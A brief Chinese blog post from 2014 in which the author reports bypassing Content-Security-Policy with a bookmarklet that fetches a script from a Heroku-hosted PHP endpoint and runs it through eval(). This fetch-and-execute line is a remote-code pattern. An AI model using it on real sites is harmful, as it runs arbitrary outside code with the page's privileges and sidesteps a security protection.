December 12, 2014

Reading time ~1 minute

昨天睡觉前通过使用ajax＋eval＋heroku成功绕过了Content-Security-Policy

代码如下：

javascript:(function(){
	var xhr = new XMLHttpRequest();
	xhr.open("get","https://safe-cliffs-9960.herokuapp.com/siteAnalyse.v5.php",false);
	xhr.send(null);
	eval(xhr.responseText);
})();
